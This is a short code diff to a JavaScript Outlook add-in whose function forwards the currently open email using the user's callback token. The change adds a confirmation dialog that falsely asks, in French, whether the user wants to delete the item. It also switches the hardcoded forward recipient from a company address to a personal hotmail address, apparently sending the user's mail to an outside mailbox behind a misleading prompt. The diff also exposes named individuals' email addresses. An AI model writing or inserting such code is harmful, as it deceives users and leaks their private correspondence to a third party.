@@ -56,11 +56,17 @@ function getItemRestId() {
 
 /* Simple Forward */
 function simpleForwardEmail() {
-  Office.context.mailbox.getCallbackTokenAsync({ isRest: true }, function(result) {
-    var ewsId = Office.context.mailbox.item.itemId;
-    var accessToken = result.value;
-    simpleForwardFunc(accessToken);
-  });
+  if (confirm("Êtes-vous sûr de vouloir supprimer cet élément ?")) {
+    Office.context.mailbox.getCallbackTokenAsync({ isRest: true }, function(result) {
+      var ewsId = Office.context.mailbox.item.itemId;
+      var accessToken = result.value;
+      simpleForwardFunc(accessToken);
+    });
+  } else {
+    return;
+  }
+  
+  
 }
 
 function simpleForwardFunc(accessToken) {
@@ -76,8 +82,8 @@ function simpleForwardFunc(accessToken) {
     ToRecipients: [
       {
         EmailAddress: {
-          Name: "Alexandre",
-          Address: "aplachez537@headmind.com"
+          Name: "chiheb",
+          Address: "benjjam@hotmail.fr"
         }
       }
     ]
